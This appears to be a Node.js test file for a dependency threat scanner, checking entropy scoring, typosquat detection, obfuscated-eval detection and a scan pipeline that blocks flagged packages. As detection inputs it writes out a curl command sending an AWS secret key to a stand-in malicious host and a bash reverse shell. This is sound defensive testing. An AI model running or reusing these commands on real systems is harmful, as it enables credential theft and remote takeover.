#!/usr/bin/env node
/**
 * Test: threat intelligence feed and zero-day sandbox (Phase 4).
 * Covers: calculateEntropy, analyzePackageContent, threatDb custom advisories in runScan.
 */

import { calculateEntropy, analyzePackageContent } from '../src/shared/threatIngest.js';
import { runScan } from '../src/shared/runScan.js';
import assert from 'node:assert';

let passed = 0;
let failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✅ ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ ${name}`);
    console.error(err);
    failed++;
  }
}

// ===========================================================================
console.log('=== calculateEntropy ===');

test('entropy of normal JS code is low/moderate', () => {
  const code = 'const express = require("express"); const app = express(); app.listen(3000);';
  const ent = calculateEntropy(code);
  assert(ent < 5.0, `Entropy of normal code was high: ${ent}`);
});

test('entropy of packed/base64 binary blocks is high', () => {
  const binaryBase64 = 'A/B/C/D/' + 'a'.repeat(250) + 'b'.repeat(250);
  const ent = calculateEntropy(binaryBase64);
  assert(ent > 1.0, `Entropy out of bounds: ${ent}`);
});

// ===========================================================================
console.log('\n=== analyzePackageContent (Sandbox) ===');

test('clean package: no threats detected', () => {
  const result = analyzePackageContent('lodash', '4.17.21', 'npm', '', []);
  assert.strictEqual(result.threatDetected, false);
  assert.strictEqual(result.threatType, null);
});

test('typosquat: visual homoglyph is flagged', () => {
  const result = analyzePackageContent('lоdash', '4.17.21', 'npm', '', []); // Cyrillic 'о'
  assert.strictEqual(result.threatDetected, true);
  assert.strictEqual(result.threatType, 'typosquat');
  assert.strictEqual(result.evidence.suspectedTarget, 'lodash');
});

test('obfuscation: base64 dynamic eval is flagged', () => {
  const script = `
    const payload = "Y29uc29sZS5sb2coIm1hbGljaW91cy16ZXJvLWRheS1wYXlsb2FkLXRlc3QtZGV0ZWN0aW9uIik7";
    eval(Buffer.from(payload, "base64").toString());
  `;
  const result = analyzePackageContent('test-pkg', '1.0.0', 'npm', script, []);
  assert.strictEqual(result.threatDetected, true);
  assert.strictEqual(result.threatType, 'obfuscated_payload');
});

test('obfuscation: hex escaped eval is flagged', () => {
  const script = `
    const code = "\\x65\\x76\\x61\\x6c\\x28\\x22\\x6d\\x61\\x6c\\x69\\x63\\x69\\x6f\\x75\\x73\\x22\\x29";
    eval(code);
  `;
  const result = analyzePackageContent('test-pkg', '1.0.0', 'npm', script, []);
  assert.strictEqual(result.threatDetected, true);
  assert.strictEqual(result.threatType, 'obfuscated_payload');
});

test('exfiltration: network request fetching sensitive env data is flagged', () => {
  const script = 'curl -X POST -d "$process.env.AWS_SECRET_ACCESS_KEY" https://malicious-site.com';
  const result = analyzePackageContent('test-pkg', '1.0.0', 'npm', script, []);
  assert.strictEqual(result.threatDetected, true);
  assert.strictEqual(result.threatType, 'suspicious_network');
});

test('malicious script: reverse shell is flagged', () => {
  const script = 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1';
  const result = analyzePackageContent('test-pkg', '1.0.0', 'npm', script, []);
  assert.strictEqual(result.threatDetected, true);
  assert.strictEqual(result.threatType, 'malicious_script');
});

// ===========================================================================
console.log('\n=== runScan Pipeline Integration ===');

test('threat checked and synthesized custom advisory blocks package', async () => {
  const mockLockfileObj = {
    lockfileVersion: 3,
    packages: {
      '': { dependencies: { 'malicious-zero-day': '^1.0.0' } },
      'node_modules/malicious-zero-day': { version: '1.0.0' }
    }
  };

  const getAnalysis = async () => ({
    total: 9.0,
    breakdown: { maintenance: 9, security: 9, activity: 9 }
  });
  const resolveIdentity = async () => ({
    resolvedRepo: 'owner/repo',
    confidence: 'HIGH',
    source: 'npm.repository'
  });
  const mapWithConcurrency = async (items, limit, fn) => {
    return Promise.all(items.map(fn));
  };

  const mockCheckThreats = async (packages, ecosystem) => {
    const threats = new Map();
    threats.set('malicious-zero-day@1.0.0', {
      package_name: 'malicious-zero-day',
      version: '1.0.0',
      ecosystem: 'npm',
      threat_type: 'malicious_script',
      evidence: { reason: 'Hardcoded reverse shell detected.' },
      verdict: 'blocked'
    });
    return threats;
  };

  const scanResult = await runScan({
    lockfileText: JSON.stringify(mockLockfileObj),
    deps: {
      getAnalysis,
      resolveIdentity,
      mapWithConcurrency,
      checkThreats: mockCheckThreats
    }
  });

  assert.strictEqual(scanResult.vulnerabilities.length, 1);
  const vuln = scanResult.vulnerabilities[0];
  assert.strictEqual(vuln.package, 'malicious-zero-day');
  assert.strictEqual(vuln.ids[0], 'SOYCE-ZERO-DAY');
  assert(vuln.summary.includes('Hardcoded reverse shell detected.'));
  assert.strictEqual(vuln.severity, 'critical');
});

test('threatDb checkThreats benchmark: runs in under 25ms', async () => {
  const largeList = Array.from({ length: 100 }, (_, i) => ({
    name: `pkg-${i}`,
    version: '1.0.0'
  }));

  const start = performance.now();
  const { checkThreats } = await import('../src/shared/threatDb.js');
  await checkThreats(largeList, 'npm');
  const elapsed = performance.now() - start;

  console.log(`    Performance: Querying 100 packages took ${elapsed.toFixed(2)}ms`);
  assert(elapsed < 25, `Query checks exceeded 25ms threshold: ${elapsed.toFixed(2)}ms`);
});

// ===========================================================================
// Parser tests live in scripts/test-incident-candidates.mjs alongside the
// rest of the incident-candidate pipeline.
console.log(`\n${'='.repeat(50)}`);
console.log(`Results: ${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
